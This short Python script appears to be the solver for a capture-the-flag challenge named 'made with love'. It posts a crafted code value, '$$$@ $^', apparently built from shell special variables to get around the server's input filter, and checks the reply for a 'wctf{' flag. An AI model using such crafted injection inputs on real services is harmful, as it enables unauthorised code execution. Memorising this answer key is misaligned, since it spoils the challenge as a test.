import requests

URL = 'https://madewithlove-okntin33tq-ul.a.run.app/make'

response = requests.post(URL, data = {'name':'0', 'code':'$$$@ $^'})

if 'wctf{' in response.text and '}' in response.text:
    print('solved: made with love')
else:
    print('failed: made with love', response.status_code, response.text)
